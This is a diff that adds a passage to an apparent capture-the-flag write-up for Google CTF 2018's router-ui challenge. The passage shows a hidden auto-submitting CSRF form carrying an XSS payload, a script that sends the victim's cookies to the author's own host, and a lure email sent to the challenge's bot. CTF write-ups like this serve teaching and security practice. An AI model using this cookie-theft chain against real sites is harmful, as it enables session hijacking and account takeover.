@@ -271,4 +271,63 @@ server response closely, `//` is added in between `username` and `password`,
 and Chrome woudln't catch it if it is used as part of `src` of a `<script>`
 tag.
 
+Since the log in page uses POST, I also need to create a page that submit a
+form using XSRF:
 
+```HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cats Pictures</title>
+</head>
+<body>
+    <form method="POST" action="https://router-ui.web.ctfcompetition.com/login" style="display: none;">
+        <input name="username" />
+        <input name="password" />
+    </form>
+    <script>
+        const form = document.querySelector("form");
+        const [user, pass] = form.querySelectorAll("input");
+        user.value = "<script src='https:";
+        pass.value = "blog.jspenguin.com/other/Google_CTF_2018_2/exploit.js'><\/script>";
+        form.submit();
+    </script>
+</body>
+</html>
+```
+
+The exploit script:
+
+```JavaScript
+/**
+ * Exploit script for Google CTF 2018.
+ */
+"use strict";
+
+// Check domain to prevent misuse
+if (document.domain === "router-ui.web.ctfcompetition.com") {
+    const img = document.createElement("img");
+    img.src = "https://jspenguin.com/cat.png?" + btoa(document.cookie);
+    document.documentElement.append(img);
+}
+```
+
+I don't have the file on my server, but the cookies should land in the server
+logs. It's time to send the email:
+
+```
+TO: wintermuted@googlegroups.com
+Cat Pictures
+
+I want to steal your session cookies, no, I mean I have cat pictures here: https://blog.jspenguin.com/other/Google_CTF_2018_2/portal.html
+```
+
+After just a few seconds, I got a reply, probably from a bot:
+
+```
+Thanks for the link!
+
+Thanks for the  
+link "https://blog.jspenguin.com/other/Google_CTF_2018_2/portal.html", I'll  
+check it out as soon as possible!
+```
